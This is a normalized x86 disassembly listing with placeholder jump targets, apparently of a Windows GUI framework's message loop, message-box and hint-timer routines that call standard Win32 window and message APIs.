inc eax
jmp r-xdata
sub_4a017c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x29e ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x68 ]
cmp [ edx + 0x29e ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x37c ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4a01cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x109
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push esp
push ebp
call GetWindowThreadProcessId
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x170 ]
push eax
call GetWindowThreadProcessId
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call __imp_SendMessageW
test eax eax
je r-xdata
mov eax ebp
call sub_46d470
test al al
jne r-xdata
cmp ebp [ eax + 0x37c ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_479ce0
mov ebp eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageW
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4a02c4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
test al al
je r-xdata
mov eax ebp
call sub_4a18c4
sub_4a02f8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x15a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_479ce0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffa4
call sub_40587c
test al al
jne r-xdata
sub_4a0364
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
mov eax [ edx ]
sub eax 0x11
je r-xdata
mov [ edx + 0xc ] 0x1
sub eax 0xb038
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push esi
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esi + 0xcc ]
call sub_40875c
test eax eax
jl r-xdata
inc eax
xor ebx ebx
inc ebx
dec eax
jne r-xdata
mov edx [ esi + 0xcc ]
cmp [ edx + edi * 4 + 0x4 ] 0x0
je r-xdata
lea edi [ ebx + ebx * 2 ]
mov edx [ esi + 0xcc ]
mov edx [ edx + edi * 4 ]
cmp edx [ esp + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax [ esi + 0xcc ]
cmp [ eax + edi * 4 + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0xcc ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_479cbc
mov eax [ esi + 0xcc ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_4763e8
jmp r-xdata
mov eax [ esi + 0xcc ]
mov eax [ eax + edi * 4 + 0x4 ]
mov edx [ esp + 0x8 ]
call sub_49bc4c
jmp r-xdata
sub_4a0418
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov edi eax
mov [ esp ] 0x0
push 0x1
push 0x20e
push 0x200
push 0x0
push esi
call __imp_PeekMessageW
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov ebp [ esi ]
test ebp ebp
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call PeekMessageW
test eax eax
je r-xdata
mov al 0x1
push ebp
call IsWindowUnicode
test eax eax
jne r-xdata
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ esp ] 0x1
cmp [ esi + 0x4 ] 0x12
je r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push esi
call PeekMessageA
cmp eax 0x1
sbb ebx ebx
inc ebx
push 0x1
push 0x0
push 0x0
push 0x0
push esi
call PeekMessageW
cmp eax 0x1
sbb ebx ebx
inc ebx
jmp r-xdata
mov [ esp + 0x2 ] al
test bl bl
jne r-xdata
mov [ edi + 0xa4 ] 0x1
mov [ esp + 0x1 ] 0x0
cmp [ edi + 0x10a ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4a22bc
test al al
jne r-xdata
lea ecx [ esp + 0x1 ]
mov edx esi
mov eax [ edi + 0x10c ]
call [ edi + 0x108 ]
mov edx esi
mov eax edi
call sub_4a02c4
test al al
jne r-xdata
cmp [ esp + 0x1 ] 0x0
jne r-xdata
mov edx esi
mov eax edi
call sub_4a017c
test al al
jne r-xdata
mov edx esi
mov eax edi
call sub_4a01cc
test al al
jne r-xdata
mov edx esi
mov eax edi
call sub_4a0134
test al al
jne r-xdata
push esi
call TranslateMessage
cmp [ esp + 0x2 ] 0x0
je r-xdata
push esi
call DispatchMessageA
jmp r-xdata
push esi
call DispatchMessageW
jmp r-xdata
sub_4a0570
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4a0418
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4a1254
sub_4a0594
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
call sub_430580
mov eax 0x8
call sub_404204
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xb0 ]
call sub_4303e0
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call __imp_SendMessageW
jmp r-xdata
sub_4a05f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call __imp_SendMessageW
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_4305a0
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_404220
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_430438
jmp r-xdata
sub_4a068c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ r-xdata ]
mov eax ebx
call sub_405894
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd1 ] al
xor eax eax
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4a07cc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call [ eax - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
xor eax eax
push ebp
push sub_4a070f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
or edx 0xffffffff
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a07d3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
retn
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax ebx
call sub_479cbc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x370 ] 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xd3 ]
xor al 0x1
mov ecx eax
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4940a8
push 0xffffffec
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x170 ]
push ebx
call GetWindowLongW
or eax 0x8000000
push eax
push 0xffffffec
push ebx
call SetWindowLongW
sub_4a07dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xad ] 0x1
xor edx edx
push ebp
push sub_4a08ed
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_49416c
call sub_410c94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a08f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xad ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_4986e4
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_4a08b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4a0570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x29a ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xdc ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ eax + 0x29a ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49fd14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xdc ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xdc ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_49bba8
jmp r-xdata
mov dl 0x1
call sub_496cd0
sub_4a0910
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_4a0983
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax ]
mov edx eax
mov ebx edx
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a098a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4054c8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4054c8
mov edx [ ebp - 0x8 ]
pop eax
call sub_407768
jne r-xdata
mov eax ebx
call sub_40557c
mov ebx eax
sub_4a0994
push ebx
push esi
push edi
mov edi edx
mov esi eax
call GetCapture
test eax eax
je r-xdata
call sub_404288
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4a0910
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call __imp_SendMessageW
call sub_4042a8
mov edx eax
mov eax ebx
call sub_415f68
mov edx [ r-xdata ]
mov eax ebx
call sub_4a0910
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xf2 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4a0ba4
jmp r-xdata
mov ecx ebx
mov edx edi
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
jmp r-xdata
sub_4a0a18
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4a20a0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x170 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_4941f8
mov [ ebp - 0x20 ] eax
call sub_49404c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_49f380
test al al
je r-xdata
mov [ ebp - 0x48 ] 0x28
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
push 0x2
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor ecx ecx
push ebp
push sub_4a0b8f
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
mov eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call MessageBoxW
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a0b96
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or esi 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x20 ]
call sub_4942bc
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_494054
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call SetWindowPos
adc edx 0x0
sub_4a0ba4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4a0c8f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_4070fc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ebx esi
cmp [ ebx + 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_49ffb0
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
mov eax edi
pop ecx
call sub_4a0a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a0c96
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
mov esi eax
cmp ebx esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_4070fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
cmp [ ebx + eax * 2 - 0x2 ] 0x2e
jbe r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4074a4
sub_4a0cb0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov esi eax
xor edi edi
mov [ esp + 0x4 ] 0x1
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax esi
call sub_4a0de4
mov ebx eax
test bl bl
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x64 ]
test edi edi
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_47a060
test al al
je r-xdata
mov eax edi
call sub_479ef8
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x4 ] 0x0
cmp [ esi + 0xac ] 0x0
jne r-xdata
mov eax [ esi + 0x170 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x2a8 ] 0x0
je r-xdata
cmp [ edi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
movzx eax bp
push eax
push 0xb01f
mov eax [ esi + 0x170 ]
push eax
call PostMessageW
mov eax esi
call sub_4a1668
test al al
je r-xdata
call sub_479ce0
mov [ esp + 0x8 ] eax
mov eax edi
call sub_479ce0
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4a1668
test al al
je r-xdata
cmp [ edi + 0x290 ] 0x0
jne r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x2a8 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov [ esp + 0x4 ] 0x0
sub_4a0de4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
test bl bl
jne r-xdata
xor edx edx
call sub_4946a4
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
test eax eax
je r-xdata
cmp [ esi + 0x30a ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x30c ]
call [ esi + 0x308 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov ebx eax
cmp [ esi + 0x30a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x30c ]
call [ esi + 0x308 ]
mov ebx eax
sub_4a0eb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4a0f2e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov eax edi
call sub_407134
mov ecx eax
mov dx 0x102
mov eax esi
call sub_4a0de4
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a0f35
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov eax esi
call sub_4a1668
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4a2010
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
sub_4a0f40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4a0fb7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
mov dx 0x1
mov eax esi
call sub_4a0de4
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a0fbe
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov eax esi
call sub_4a1668
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4a2010
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
sub_4a0fd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4a104e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov eax edi
call sub_407134
mov ecx eax
mov dx 0x102
mov eax esi
call sub_4a0de4
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a1055
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov eax esi
call sub_4a1668
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4a2010
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x18 ]
jmp r-xdata
sub_4a1060
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4a10bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4a1668
mov ebx eax
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a10c2
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push 0x3
push 0x0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4a2010
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
sub_4a10dc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x84 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_470fdc
jmp r-xdata
sub_4a1164
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_49d58c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_479ce0
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d578
mov ebx eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax ebx
call sub_479ce0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x100 ]
sub_4a11c8
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_46f174
cmp eax [ ebx + 0x48 ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov [ ebx + 0x48 ] eax
sub_4a11ec
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_4a1231
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push eax
push 0x0
call KillTimer
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4a1164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4a1254
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4a13bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4a11c8
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_49e3b8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_46d7ec
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4a14ac
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_4a1364
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
mov eax [ ebp - 0x4 ]
call sub_4a18c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc0 ] 0x0
jg r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4a1164
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_43b054
test al al
je r-xdata
